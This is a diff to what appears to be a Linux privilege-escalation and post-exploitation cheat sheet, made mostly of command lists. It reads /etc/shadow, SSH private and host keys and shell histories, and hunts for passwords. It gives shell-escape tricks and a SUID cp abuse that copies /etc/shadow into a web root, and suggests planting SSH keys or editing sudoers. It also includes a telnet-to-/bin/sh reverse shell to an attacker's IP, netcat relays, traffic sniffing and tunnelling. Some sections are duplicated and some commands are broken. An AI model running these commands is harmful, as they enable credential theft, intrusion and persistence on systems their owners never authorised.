@@ -19,8 +19,9 @@ rpm -q kernel
 dmesg | grep Linux
 ls /boot | grep vmlinuz-
 
-cat /proc/cpuinfo CPU information
-df -a File system information
+cat /proc/cpuinfo   // CPU information
+df -a   // File system information
+
 
   == What can be learnt from the environmental variables? ==
 cat /etc/profile
@@ -50,75 +51,81 @@ lastlog –u %username% // Information on when the specified user last logged in
 
   == User & Privilege Information: ==
 
-Command Result
-whoami Current username
-id Current user information
-cat /etc/sudoers Who’s allowed to do what as root – Privileged command
-sudo -l Can the current user perform anything as root
+whoami 
+id 
+cat /etc/sudoers  // Who’s allowed to do what as root – Privileged command
+sudo -l  // Can the current user perform anything as root
+cat /etc/passwd | cut -d:    # List of users
+grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+cat /etc/sudoers
 
-Environmental Information:
+## What has the user being doing? Is there any password in plain text? What have they been edting?
+cat ~/.bash_history
+cat ~/.nano_history
+cat ~/.atftp_history
+cat ~/.mysql_history 
+cat ~/.php_history
 
-Command Result
-env Display environmental variables
-set As above
-echo $PATH Path information
-history Displays command history of current user
-pwd Print working directory, i.e. ‘where am I’
-cat /etc/profile Display default system variables
 
-Interesting Files:
+What user information can be found? 
+cat ~/.bashrc
+cat ~/.profile
+cat /var/mail/root
+cat /var/spool/mail/root
 
-Command Result
-find / -perm -4000 -type f 2>/dev/null Find SUID files
-find / -uid 0 -perm -4000 -type f 2>/dev/null Find SUID files owned by root
-find / -perm -2000 -type f 2>/dev/null Find files with GUID bit set
-find / -perm -2 -type f 2>/dev/null Find world-writable files
-find / -perm -2 -type d 2>/dev/null Find word-writable directories
-find /home –name .rhosts -print 2>/dev/null Find rhost config files
-ls -ahlR /root/ See if you can access other user directories to find interesting files – Privileged command
-cat ~/.bash_history Show the current users’ command history
-ls -la ~/._history Show the current users’ various history files
-ls -la ~/.ssh/ Check for interesting ssh files in the current users’ directory
-ls -la /usr/sbin/in.* Check Configuration of inetd services
-grep -l -i pass /var/log/*.log 2>/dev/null Check log files for keywords (‘pass’ in this example) and show positive matches
-find /var/log -type f -exec ls -la {} ; 2>/dev/null List files in specified directory (/var/log)
-find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null List .log files in specified directory (/var/log)
-find /etc/ -maxdepth 1 -name .conf -type f -exec ls -la {} ; 2>/dev/null List .conf files in /etc (recursive 1 level)
-ls -la /etc/.conf As above
-find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null Find .conf files (recursive 4 levels) and output line number where the word password is located
-lsof -i -n List open files (output will depend on account privileges)
+Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+ps aux | grep root
+ps -ef | grep root
 
-Service Information:
 
-Command Result
-ps aux | grep root View services running as root
-cat /etc/inetd.conf List services managed by inetd
-cat /etc/xinetd.conf As above for xinetd
+What applications are installed? What version are they? Are they currently running?
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/ 
 
-Jobs/Tasks:
+  == Environmental Information: ==
 
-Command Result
-crontab -l -u %username% Display scheduled jobs for the specified user – Privileged command
-ls -la /etc/cron* Scheduled jobs overview (hourly, daily, monthly etc)
-ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null What can ‘others’ write in /etc/cron* directories
-top List of current tasks
+env  // Display environmental variables
+set  // As above
+echo $PATH  // Path information
+history // Displays  command history of current user
+cat /etc/profile // Display default system variables
 
-Networking, Routing & Communications:
+## Which service(s) are been running by root? Of these services, which are vulnerable - it's worth a double check!
+ps aux | grep root
+ps -ef | grep root
 
-Command Result
-/sbin/ifconfig -a List all network interfaces
-cat /etc/network/interfaces As above
-arp -a Display ARP communications
-route Display route information
-cat /etc/resolv.conf Show configured DNS sever addresses
-netstat -antp List all TCP sockets and related PIDs (-p Privileged command)
-netstat -anup List all UDP sockets and related PIDs (-p Privileged command)
-iptables -L List rules – Privileged command
-cat /etc/services View port numbers/services mappings
 
-Programs Installed:
+    == What applications are installed? What version are they? Are they currently running? ==
+ls -alh /usr/bin/
+ls -alh /sbin/
+dpkg -l
+rpm -qa
+ls -alh /var/cache/apt/archivesO
+ls -alh /var/cache/yum/ 
 
-Command Result
+    == Any of the service(s) settings misconfigured? Are any (vulnerable) plugins attached? ==
+cat /etc/syslog.conf 
+cat /etc/chttp.conf
+cat /etc/lighttpd.conf
+cat /etc/cups/cupsd.conf 
+cat /etc/inetd.conf 
+cat /etc/apache2/apache2.conf
+cat /etc/my.conf
+cat /etc/httpd/conf/httpd.conf
+cat /opt/lampp/etc/httpd.conf
+ls -aRl /etc/ | awk '$1 ~ /^.*r.*/ 
+
+ps aux | grep root  // View services running as root
+cat /etc/inetd.conf  // List services managed by inetd
+cat /etc/xinetd.conf // As above for xinetd
+
+
+    == Installed programs == 
 dpkg -l Installed packages (Debian)
 rpm -qa Installed packages (Red Hat)
 sudo -V Sudo version – does an exploit exist?
@@ -133,19 +140,90 @@ ruby -v Installed Ruby version details
 find / -name %program_name% 2>/dev/null (i.e. nc, netcat, wget, nmap etc) Locate ‘useful’ programs (netcat, wget etc)
 which %program_name% (i.e. nc, netcat, wget, nmap etc) As above
 
-Common Shell Escape Sequences:
+    == SSH info ? ==
+## Can private-key information be found? 
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
 
-Command Program(s)
-:!bash vi, vim
-:set shell=/bin/bash:shell vi, vim
-!bash man, more, less
-find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; find
-awk 'BEGIN {system("/bin/bash")}' awk
---interactive nmap
-perl -e 'exec "/bin/bash";' Perl 
+
+  == Jobs/Tasks: ==
+
+crontab -l -u %username% // Display scheduled jobs for the specified user – Privileged command
+ls -la /etc/cron* // Scheduled jobs overview (hourly, daily, monthly etc)
+ls -aRl /etc/cron* | awk '$1 ~ /w.$/' 2>/dev/null // What can ‘others’ write in /etc/cron* directories
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+
+    == Interesting Files: ==
+
+find / -perm -4000 -type f 2>/dev/null  // Find SUID files
+find / -uid 0 -perm -4000 -type f 2>/dev/null // Find SUID files owned by root
+find / -perm -2000 -type f 2>/dev/null // Find files with GUID bit set
+find / -perm -2 -type f 2>/dev/null // Find world-writable files
+find / -perm -2 -type d 2>/dev/null // Find word-writable directories
+find /home –name .rhosts -print 2>/dev/null // Find rhost config files
+ls -ahlR /root/     // See if you can access other user directories to find interesting files – Privileged command
+cat ~/.bash_history // Show the current users’ command history
+ls -la ~/._history // Show the current users’ various history files
+ls -la ~/.ssh/ Check // for interesting ssh files in the current users’ directory
+ls -la /usr/sbin/in.* // Check Configuration of inetd services
+find /var/log -type f -exec ls -la {} ; 2>/dev/null List files in specified directory (/var/log)
+find /var/log -name *.log -type f -exec ls -la {} ; 2>/dev/null List .log files in specified directory (/var/log)
+find /etc/ -maxdepth 1 -name .conf -type f -exec ls -la {} ; 2>/dev/null List .conf files in /etc (recursive 1 level)
+ls -la /etc/.conf As above
+lsof -i -n List open files (output will depend on account privileges)
+
+## What sensitive files can be found? 
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+ls -alh /var/mail/
+
+
+## Anything "interesting" in the home directorie(s)? If it's possible to access
+ls -ahlR /root/
+ls -ahlR /home/
+
+# Search for specific strings inside a file
+strings ./*.txt | grep password
+grep -l -i pass /var/log/*.log 2>/dev/null
+find / -maxdepth 10 -name *.conf -type f | grep -Hn pass; 2>/dev/null // searches for the string 'password' and output the line number
+find / -maxdepth 10 -name *etc* -type f | grep -Hn pass; 2>/dev/null  //as above, but in *etc*
+grep -l -i pass /var/log/*.log 2>/dev/null Check log files for keywords (‘pass’ in this example) and show positive matches
+find / -maxdepth 4 -name *.conf -type f -exec grep -Hn password {} ; 2>/dev/null Find .conf files (recursive 4 levels) and output line number where the word password is located
+grep -i user [filename]
+grep -i pass [filename]
+grep -C 5 "password" [filename]
+find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla 
+
+cat /var/apache2/config.inc
+cat /var/lib/mysql/mysql/user.MYD 
+cat /root/anaconda-ks.cfg
+
+find / -name "network-secret.txt"
+locate "network-secret.txt"
  
- 
- == Privillege escalation in Linux ==
 ## Finds files that have the sticky bit set. 
 find / -perm -u=s -type f 2>/dev/null
   perm // permission 
@@ -156,8 +234,107 @@ find / -perm -u=s -type f 2>/dev/null
 ## We found cp (copy) in the above list and now we are abusing it:
 cp -f --no-preserve=all /etc/shadow /var/www/html/joomla/shadow.txt
 
+
 Few things to keep in mind:
 ## (1) at the destination, the file owner will be root but the group will be that of the current user and 
 ## (2) notice the use of "--no-preserve" this is needed to read out protected files.
 ## A lot of ways we can abuse this, update the shadow file with a new account, modify sudoers, plant ssh key + modify sshd_config ## + reboot,or cron.hourly.
 
+    == File system ==
+Which configuration files can be written in /etc/? Able to reconfigure a service?
+ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null        # Owner
+ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null          # Other
+
+find /etc/ -readable -type f 2>/dev/null                         # Anyone
+find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone 
+
+
+    == Networking, Routing & Communications: ==
+
+Command Result
+/sbin/ifconfig -a // List all network interfaces
+cat /etc/network/interfaces // As above
+cat /etc/sysconfig/network 
+arp -a Display ARP communications
+route Display route information
+cat /etc/resolv.conf Show configured DNS sever addresses
+netstat -antp List all TCP sockets and related PIDs (-p Privileged command)
+netstat -anup List all UDP sockets and related PIDs (-p Privileged command)
+iptables -L List rules – Privileged command
+cat /etc/services View port numbers/services mappings
+
+
+    == What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway? ==
+cat /etc/resolv.conf
+cat /etc/sysconfig/network
+cat /etc/networks
+iptables -L
+hostname
+dnsdomainname
+
+
+
+    == Common Shell Escape Sequences: ==
+
+:!bash vi, vim
+:set shell=/bin/bash:shell vi, vim
+!bash man, more, less
+find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ; find
+awk 'BEGIN {system("/bin/bash")}' awk
+--interactive nmap
+perl -e 'exec "/bin/bash";' Perl 
+ 
+ 
+    == What other users & hosts are communicating with the system? ==
+lsof -i 
+lsof -i :80
+grep 80 /etc/services
+netstat -antup
+netstat -antpx
+netstat -tulpn
+chkconfig --list
+chkconfig --list | grep 3:on
+last
+w
+
+    == Whats cached? IP and/or MAC addresses ==
+arp -e
+route
+/sbin/route -nee
+
+
+    == Is packet sniffing possible? What can be seen? Listen to live traffic ==
+# tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
+tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
+
+
+    == Have you got a shell? Can you interact with the system? ==
+# http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
+nc -lvp 4444    # Attacker. Input (Commands)
+nc -lvp 4445    # Attacker. Ouput (Results)
+telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
+
+
+    == Is port forwarding possible? Redirect and interact with traffic from another view ==
+# rinetd
+http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
+
+# fpipe
+FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
+FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
+
+# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
+ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+
+# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
+mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
+mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
+
+
+Is tunnelling possible? Send commands locally, remotely
+ssh -D 127.0.0.1:9050 -N [username]@[ip] 
+proxychains ifconfig
